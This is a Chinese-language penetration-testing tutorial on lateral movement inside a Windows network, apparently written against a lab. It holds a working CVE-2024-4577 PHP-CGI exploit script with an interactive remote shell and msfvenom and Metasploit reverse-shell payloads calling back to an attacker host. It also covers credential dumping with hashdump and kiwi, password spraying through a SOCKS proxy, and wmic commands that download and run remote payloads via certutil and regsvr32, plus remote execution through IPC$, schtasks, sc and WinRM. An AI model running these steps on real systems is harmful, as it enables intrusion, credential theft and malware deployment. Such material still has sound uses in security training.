# 一、横向移动简介
当攻击者在拿下一台内网主机后，通常会利用当前拿下的机器当作跳板，进一步攻击内网其他主机，扩大攻击影响范围。

横向移动有三个主要阶段： 
- 侦察（主机信息收集、内网网络结构信息收集） 
- 凭据/特权收集（主机密码凭证） 
- 对网络中其他计算机的访问权限

# 二、获取权限
反弹shell到MSF

1.进入msfconsole使用web_delivery模块生成反弹shell的payload
```
use exploit/multi/script/web_delivery
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.58.129
set lport 6666
set target 2
```
![[Pasted image 20250406205910.png]]

2.通过WEB漏洞反弹shell
结合收集到的信息，通过搜索发现最近暴出一个 PHP CGI 远程代码执行漏洞 --  CVE-2024-4577

- 漏洞描述
[PHP CGI Windows平台远程代码执行漏洞（CVE-2024-4577）复现_cve-2024-4577漏洞复现-CSDN博客](https://blog.csdn.net/huangyongkang666/article/details/139659619)

- 影响范围
```
PHP 8.3 < 8.3.8
PHP 8.2 < 8.2.20
PHP 8.1 < 8.1.29
```

- xray
![[Pasted image 20250406204532.png]]

- nuclei
![[Pasted image 20250406204452.png]]

- python
```python
#!python3
# -*- encoding: utf-8 -*-
'''
@File    :   CVE-2024-4577.py
@Time    :   2024/08/12 19:06:44
@Author  :   mingy
@Version :   1.0
@Desc    :   None
'''

import argparse
import requests

s = requests.Session()
s.verify = False

uri = "/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"

def poc(url):
    body = "<?php echo md5('mingy');die;?>"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    r = s.get(f'{url}{uri}', headers=headers, data=body)
    if '345c13c987991573d06568f15abeb671' in r.text:
        print(f"[+] 存在CVE-2024-4577漏洞: {url}")
    else:
        print(f"[-] 不存在CVE-2024-4577漏洞: {url}")

def exp(url):
    while True:
        cmd = input("cmd>>> ")
        if cmd == "quit" or cmd == "exit":
            break
        body = f"<?php system('{cmd}');echo 'mingy';die;?>"
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        r = s.get(f'{url}{uri}', headers=headers, data=body)
        print(r.text)

def main():
    p = argparse.ArgumentParser(description='CVE-2024-4577 POC/EXP')
    p.add_argument('-u', dest='url', type=str, help="url to test")
    p.add_argument('-m', dest='model', type=str, help="model : poc or exp")
    args = p.parse_args()
    url = args.url
    model = args.model
    if not url:
        print("please set url, -u url")
    if not model:
        print("please set model, -m poc/exp")
    elif model == 'poc':
        poc(url)
    elif model == 'exp':
        exp(url)

if __name__ == '__main__':
    main()
```
![[Pasted image 20250406205439.png]]
![[Pasted image 20250406205810.png]]

- 得到MSF会话
![[Pasted image 20250406210039.png]]

- 获取账号密码及Hash
```
getuid
hashdump
getsystem
load kiwi
creds_all
```
![[Pasted image 20250406210543.png]]

- 登录验证
```
crackmapexec smb 192.168.58.30 -u administrator -p '1qaz@wsx'  --local-auth --users

crackmapexec smb 192.168.58.30 -u administrator -p '1qaz@wsx' --local-auth --shares

smbclient //192.168.58.30/C$ -U 'pc\administrator%1qaz@wsx'
```
![[Pasted image 20250406212054.png]]

- 内网主机存活探测
上传工具：nbtscan和arp-scan
![[Pasted image 20250406221009.png]]

进行扫描：
![[Pasted image 20250406221316.png]]

# 三、内网密码喷洒
## （1）建立socks代理
1.上传agent
![[Pasted image 20250406221450.png]]

2.启动admin节点
```
./admin -l 9999
```

3.上线agent节点 
- 方式1
```
agent.exe -c 192.168.58.129:9999
```

- 方式2
```
crackmapexec smb 192.168.58.30 -u administrator -p '1qaz@wsx' -x 'cmd.exe /c c:/agent.exe -c 192.168.58.129:9999' --local-auth
```
![[Pasted image 20250406222252.png]]

4.启动socks代理
![[Pasted image 20250406222351.png]]

## （2）配置proxychains
```
vim /etc/proxychains4.conf
```

## （3）crackmapexec密码喷洒
```
proxychains -q crackmapexec smb 10.10.10.10-30 -u administrator -p '1qaz@wsx' --local-auth
```
![[Pasted image 20250406222849.png]]

# 四、横向移动-内置工具篇
## （1）IPC$
### 1）IPC$简介
IPC$ ( Internet Process Connection) 是共享 "命名管道" 的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。

利用 IPC$，连接者与目标主机利用建立的连接可以得到目标主机上的目录结构、用户列表等信息。

### 2）使用条件
1.开放了139、445端口
- 我们可以通过 139 和 445 端口来实现对共享文件/打印机的访问，因此一般来讲，IPC$ 连接是需 要 139 或 445 端口来支持的。
- IPC$ 连接可以实现远程登陆及对默认共享的访问，而 139 端口的开启表示 netbios 协议的应 用。
- IPC$ 连接默认会走 445 端口，不通的话则会走 139 端口，这两个端口都可以单独实现文件共享

2.目标开启 IPC$ 文件共享服务及默认共享
- 默认共享是为了方便管理员远程管理而默认开启的共享。
- 所有逻辑磁盘（`c$、d$、e$…）`和系统目录 WINNT 或 WINDOWS（ADMIN$），通过IPC连接可以实现对这些默认共享的访问
![[Pasted image 20250406224405.png]]

3.需要目标机器的管理员账号和密码
- 默认情况下只有被添加到远程计算机管理员组的域用户（域管用户）有权限对 admin$ 目录建立 IPC 连接 
- 本地的 Administrator 用户也可以，如果启用了该用户，那么也可以使用 Administrator 用户远程连接

### 3）常用命令
1.查看连接情况
```
net use
```
![[Pasted image 20250407194333.png]]

2.连接远程主机
通过密码喷洒获取20主机的密码
```
net use \\10.10.10.20\ipc$ /user:administrator "1qaz@wsx"
```
![[Pasted image 20250412163516.png]]

3.查看目标主机时间
```
net time \\10.10.10.20
```

4.文件上传下载
- 上传文件
```
copy agent.exe \\10.10.10.20\c$\agent.exe
```

- 查看目标主机文件
```
dir \\10.10.10.20\c$
```

- 下载文件
```
copy \\10.10.10.20\c$\a.txt.exe c:\tools
```

5.查看/删除共享的资源
```
net share
net share C$ /del
```
![[Pasted image 20250412152122.png]]

6.共享计算机C盘
```
net share C$=c:\
```
![[Pasted image 20250412152209.png]]

7.开放/关闭 ipc$ 共享
```
net share ipc$
net share ipc$ /del
```

8.映射共享磁盘到本地
```
net use z: \\10.10.10.20\c$ /user:administrator "1qaz@WSX"
```
![[Pasted image 20250412152503.png]]

9.删除连接
```
net use \\10.10.10.20\ipc$ /del
net use z: /del
net use * /del /y
```

### 4）IPC$连接失败常见错误号
| 错误 号 | 描述                       | 错误原因                                            |
| ---- | ------------------------ | ----------------------------------------------- |
| 5    | 拒绝访问                     | 很可能你使用的用户不是管理员权限，先提升权限                          |
| 51   | Windows无法找到网络路径          | 网络有问题                                           |
| 53   | 找不到网络路径                  | ip地址错误；目标未开机；目标lanmanserver服务未 启动；目标有防火墙 (端口过滤) |
| 67   | 找不到网络名                   | 你的LanManWorkStation服务未启动；目标删除了 ipcs;            |
| 1219 | 提供的凭据与已存在的凭据集冲突          | 你已经和对方建立了一个ipcS，请删除后再连                          |
| 1326 | 未知的用户名或错误密码              | 用户名或密码错误                                        |
| 1385 | 登录失败：未授予用户在此计算 机上的请求登录类型 | 可能是因为未授予用户登录类型                                  |
| 1792 | 试图登录，但是网络登录服务没有启动        | 目标NetLogon服务未启动，连接域控会出现此情况                      |
| 2242 | 此用户的密码已经过期               | 目标有帐号策略，强制定期要求更改密码                              |
## （2）IPC+AT+Schtasks
### 1）AT简介
AT命令可在指定时间和日期、在指定计算机上运行命令和程序。
AT命令在 windows server 2012 等新版系统中已被弃用 
AT命令如果找不到网络路径，则判断是目标主机已禁用 Task Scheduler 服务

- 问题：执行at命令时，显示绑定句柄无效。 
- 解决：echo 10.10.11.100 RemoteHost > C:\Windows\System32\drivers\etc\hosts

### 2）利用
1.建立连接
```
net use \\10.10.10.20\c$ /user:administrator "1qaz@wsx"
```

2.生成exe
```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.58.129 lport=7777 -f exe -o x7.exe
```

3.上传exe
```
upload /tools/shell/x7.exe c:/x7.exe
```
![[Pasted image 20250412162628.png]]

4.上传至20主机
```
copy x7.exe \\10.10.10.20\c$\x7.exe
```
![[Pasted image 20250412162936.png]]

5.查看远程主机时间
```
net time \\10.10.10.20
```
![[Pasted image 20250412163719.png]]

6.AT命令添加任务
```
at \\10.10.10.20 16:53 c:\x7.exe
```
![[Pasted image 20250412165550.png]]

7.AT命令查看任务
```
at \\10.10.10.20
```
![[Pasted image 20250412170053.png]]

8.AT命令删除任务
```
at \\10.10.10.20 2 /delete
```
![[Pasted image 20250412170255.png]]

### 3）Schtasks简介
由于 AT 在 windows server 2012 等新版系统中已被弃用，所以需要使用 schtasks 命令代替。

Schtasks允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任务

```
/Create     创建新计划任务。
/Delete     删除计划任务。
/Query      显示所有计划任务。
/Change     更改计划任务属性。
/Run        按需运行计划任务。
/End        中止当前正在运行的计划任务。
/ShowSid    显示与计划的任务名称相应的安全标识符。
/sc         指定计划类型。有效值为 MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY、ONCE、ONSTART、ONLOGON、ONIDLE。
/mo         指定任务在其计划类型内的运行频率。这个参数对于 MONTHLY 计划是必需的。对于 MINUTE、HOURLY、DAILY 或 WEEKLY 计划，这个参数有效，但也可选。默认值为 1。
/tr         指定任务运行的程序或命令。如果忽略该路径，SchTasks.exe 将假定文件在 Systemroot\System32 目录下。
/tn         指定任务的名称。
/?          显示此帮助消息。
```

### 4）横向移动
命令格式
```
#创建任务
schtasks /create /tn task1 /U 域\域用户 /P 域用户密码 /tr 命令 /sc ONSTART /s 域机器ip /RU system

#运行任务
schtasks /run /tn task1 /s 192.168.10.2 /U 域/域用户 /P 域用户密码

#删除任务
schtasks /F /delete /tn task1 /s 域机器ip /U 域\域用户 /p 域用户密码
```

1.建立IPC连接
```
net use \\10.10.10.20 /user:administrator "1qaz@wsx"
net use
```

2.上传木马
```
dir \\10.10.10.20\c$
copy c:\x7.exe \\10.10.10.20\c$
```

3.远程主机创建定时任务
```
schtasks /create /s 10.10.10.20 /u administrator /p "1qaz@wsx" /sc MINUTE /mo 1 /tn test2 /tr "c:\\x7.exe"
```
![[Pasted image 20250412173410.png]]

4.查看远程主机创建的定时任务
```
chcp 65001
schtasks /query /s 10.10.10.20 /tn test2
```
![[Pasted image 20250502105713.png]]

注意：不更改代码页编码，直接查看可能会显示如下错误：
![[Pasted image 20250412173637.png]]

![[Pasted image 20250412173702.png]]

5.Schtasks运行远程主机上的计划任务
```
schtasks /run /s 10.10.10.20 /u administrator /p "1qaz@wsx" /tn test2
```

6.Schtasks删除远程主机上的计划任务
```
schtasks /delete /tn test2 /s 10.10.10.20 /u administrator /p "1qaz@wsx"
```

## （3）IPC+SC
### 1）SC简介
sc 命令可以注册、删除和查询系统服务

### 2）SC远程注册服务
```
# 本地系统启动时启动服务
sc \\10.10.10.20 create test binpath= "c:\x7.exe" password= 1qaz@wsx

# 当 "mingy\administrator" 用户登录时启动服务
sc \\10.10.10.20 create test binpath= "c:\xx.exe" obj= "mingy\administrator" password= 1qaz@wsx

# sc查询服务信息
sc \\10.10.10.20 qc test

# sc启动指定服务
sc \\10.10.10.20 start test

# sc停止指定服务
sc \\10.10.10.20 stop test
sc \\10.10.10.20 delete test
```
注意：“=”后要有一个空格
![[Pasted image 20250414092751.png]]

会话关闭的原因：
当以服务启动一个程序时，如果程序不跟scm（服务控制管理器）进行通信，会认为程序错误，从而终止掉

解决方法：生成一个可以通信的程序
```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.58.129 lport=8888 -f exe-service -o x8.exe
```

## （4）WMIC
### 1)WMIC简介
WMI（Windows Management Instrumentation，即 Windows 管理规范），是一种用于用户管理本地和远程计算机的模型。借助 WMI，用户能够访问、配置、管理以及监视几乎所有的 Windows 资源。它的语法较为简单，常见的命名空间、对象等表述基本一致。在 Windows 系统中，WMI 对应着 WMI 服务（winmgmt），自 Windows 2000 之后的操作系统都内置了该服务。​

WMI 运用公共信息模型（CIM）来表示托管组件，这些组件涵盖系统、应用程序、网络等。CIM 中通过类来表示管理对象，命名空间则是类的集合。在进行远程访问时，WMI 利用 135 端口上的远程过程调用（RPC）实现通信，这使得系统管理员可以远程执行自动化管理任务，比如远程启动服务或者执行命令。​

而 WMIC，是专门为 WMI 提供的命令行界面，方便用户通过命令行操作来运用 WMI 的强大功能。

### 2）命令使用条件
1. Windows Management Instrumentation 服务开启，端口TCP 135，默认开启 
2. 防火墙允许 135、445 等端口通信

### 3）利用方法
- 查询进程信息
```
wmic /node:10.10.10.20 /user:administrator /password:1qaz@wsx process list brief
```
![[Pasted image 20250502111348.png]]

WMI不支持执行命令，而是支持执行文件，可以通过加相应的参数执行命令，比如：
```
wmic /node:10.10.10.20 /user:administrator /password:1qaz@wsx process call create "cmd.exe /c ipconfig"
```
![[Pasted image 20250502113949.png]]

- 利用create创建进程
```
wmic process call create /?
```

```
wmic /node:10.10.10.20 /user:administrator /password:1qaz@wsx process call create "cmd /c calc.exe"
```
如果出现 User credentials cannot be used for local connections,应该是调用 calc.exe程序权限不够的问题 。
如果出现 Description = 无法启动服务，原因可能是已被禁用或与其相关联的设备没有启动，判断 WMI服务被禁用。
wmic命令缺点是没有回显，可以使用 wmiexec.vbs脚本实现回显。

或者执行命令，将输出信息重定向
```
wmic /node:10.10.10.20 /user:administrator /password:1qaz@wsx process call create "cmd.exe /c ipconfig > c:/info.txt"
```
```
type \\10.10.10.20\c$\info.txt
```

![[Pasted image 20250502114837.png]]

- 下载远程文件并执行
```
wmic /node:10.10.10.20 /user:administrator /password:1qaz@wsx process call create "cmd /c  certutil.exe -urlcache -split -f http://10.10.10.80/test.exe c:/windows/temp/test.exe & c:/windows/temp/test.exe"

wmic /node:10.10.10.20 /user:administrator /password:1qaz@wsx process call create "regsvr32 /s /n /u /i:http://192.168.78.117:8080/feY7nzY.sct scrobj.dll"
```

## （5）WinRM
### 1）WinRM简介
WinRM 指的是Windows远程管理服务，通过远程连接winRM模块可以操作windows命令行，默认监听端口5985（HTTP）和5986 (HTTPS)，在2012及以后默认开启。

### 2）开启WinRM
- 判断本机是否开启WinRM服务
```
winrm enumerate winrm/config/listener
```
![[Pasted image 20250502120334.png]]

```
netstat -ano | findstr 5985

wmic service list brief | findstr WinRM
```
![[Pasted image 20250502120552.png]]

- 判断远程主机是否开启WinRM服务
查看远程主机是否开启WinRM服务：
使用工具进行内网端口扫描（5985，5986）

查看远程WinRM服务是否正常：
```
test-wsman 10.10.10.20
```
![[Pasted image 20250502121527.png]]
有信息说明服务开启

- 命令开启WinRM服务
```
winrm quickconfig
```
![[Pasted image 20250502122503.png]]

- 允许远程主机访问及访问远程主机
WinRM只允许当前域用户或者处于本机TrustedHosts列表中的远程主机进行访问
```
winrm set winrm/config/client @{TrustedHosts="*"}
```
![[Pasted image 20250502122804.png]]

### 3)Winrs执行命令
```
winrs -r:http://10.10.10.20:5985 -u:administrator -p:1qaz@wsx ipconfig
```
![[Pasted image 20250502122936.png]]

```
winrs -r:http://10.10.10.20:5985 -u:administrator -p:1qaz@wsx "cmd.exe"
```
![[Pasted image 20250502123149.png]]

### 4）WinRM横向移动
- 利用winrm参数选项中的invoke参数，来对目标对象执行特定的方法。
```
winrm invoke create wmicimv2/win32_process @{Commandline="calc.exe"}
```
命令调用了Windows WMI中Win32_process类的Create方法，生成了一个calc.exe的新进程
![[Pasted image 20250502123646.png]]

- 在远程机器上打开进程
```
winrm invoke create wmicimv2/win32_process @{Commandline="calc.exe"} -r:http://10.10.10.20:5985 -u:administrator -p:1qaz@wsx
```
![[Pasted image 20250502123753.png]]

- 在远程机器上创建服务
```
winrm invoke Create wmicimv2/Win32_Service @{Name="test";DisplayName="test";PathName="cmd.exe /k c:\x8.exe"} -r:http://10.10.10.20:5985 -u:administrator -p:1qaz@wsx
```

- 在远程机器上启动服务
```
winrm invoke StartService wmicimv2/Win32_Service?Name=test -r:http://10.10.10.20:5985 -u:administrator -p:1qaz@wsx
```
如果会话断开，可参考上面的sc




